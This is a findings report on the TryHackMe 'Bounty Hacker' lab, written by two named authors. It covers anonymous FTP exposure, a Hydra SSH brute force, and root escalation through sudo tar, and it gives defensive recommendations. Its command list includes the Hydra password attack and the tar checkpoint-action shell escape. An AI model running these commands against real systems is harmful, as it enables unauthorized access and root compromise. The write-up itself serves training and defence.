# Security Findings — TryHackMe Bounty Hacker

**Authors:** Tiago Santos & Valeria Mosquera Díaz  
**Environment:** Authorized TryHackMe Linux lab, 12 November 2026  
**Scope:** Session target `10.82.180.192`

> Severity ratings are qualitative assessments for this lab, not formal CVSS scores.

| Severity | Finding | Evidence | Impact | Recommendation |
| --- | --- | --- | --- | --- |
| **Medium** | Anonymous FTP access | Nmap's `ftp-anon` output; `ftp` login with `anonymous` | Exposed `task.txt` and `locks.txt` | Disable anonymous FTP unless explicitly required; restrict readable files |
| **High** | Password candidates leaked and valid SSH credential recovered | `task.txt` identified `lin`; `locks.txt` provided candidate passwords; Hydra found one match | Interactive SSH session as `lin` | Remove sensitive data from shared folders; prefer key-based SSH and strong unique passwords |
| **Critical** | Excessive sudo privileges for `/bin/tar` | `sudo -l` returned `(root) /bin/tar`; `whoami` returned `root` after checkpoint execution | Local user obtained a root shell | Remove unrestricted sudo access to `tar`; enforce least privilege and audited wrappers |

## Verified Service Versions

The following were observed in the **actual Nmap screenshot** from 12 November 2026:

| Port | Service | Observed version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd **3.0.5** |
| 22/tcp | SSH | OpenSSH **8.2p1** (Ubuntu) |
| 80/tcp | HTTP | Apache httpd **2.4.41** (Ubuntu) |

## Reproducible Commands

```bash
nmap -sC -sV <TARGET_IP>
ftp <TARGET_IP>                    # Login as anonymous, then use ls/get
hydra -l lin -P locks.txt ssh://<TARGET_IP>
ssh lin@<TARGET_IP>
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
```

## Defensive Priorities

1. **Eliminate unnecessary anonymous access** and review file-system permissions.
2. **Protect account credentials**, move away from reused passwords, and use SSH keys where possible.
3. **Review all sudoers entries** for binaries that execute subprocesses, with emphasis on root-level exemptions.

## References

- [TryHackMe — Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins — tar sudo technique](https://gtfobins.github.io/gtfobins/tar/#sudo)

**Prepared by Tiago Santos & Valeria Mosquera Díaz.**
